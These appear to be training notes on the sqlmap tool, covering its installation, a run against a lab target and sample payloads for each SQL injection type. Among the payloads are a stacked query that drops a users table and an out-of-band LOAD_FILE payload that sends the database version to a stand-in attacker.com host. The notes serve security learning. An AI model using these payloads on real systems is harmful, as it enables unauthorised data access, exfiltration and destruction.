** Detects and exploits SQL injection flaws

```shell-session
python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'
```

```shell-session
sudo apt install sqlmap
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
python sqlmap.py
```

## Supported SQL Injection Types
```shell-session
sqlmap -hh
```
- B: Boolean-based blind
- E: Error-based
- U: Union query-based
- S: Stacked queries
- T: Time-based blind
- Q: Inline queries

## Boolean-based SQL Injection
```shell-session
AND 1=1
```

## Error-based SQL Injection
```shell-session
AND GTID_SUBSET(@@version,0)
```
- DBMS may respond with errors for a query, giving valuable information on what it is looking for

## UNION query-based
```shell-session
UNION ALL SELECT 1,@@version,3
```

## Stacked queries
```shell-session
; DROP TABLE users
```

## Time-based blind SQL Injection
```shell-session
AND 1=IF(2>1,SLEEP(5),0)
```

## Inline queries
```shell-session
SELECT (SELECT @@version) from
```

## Out-of-band SQL Injection
```shell-session
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```



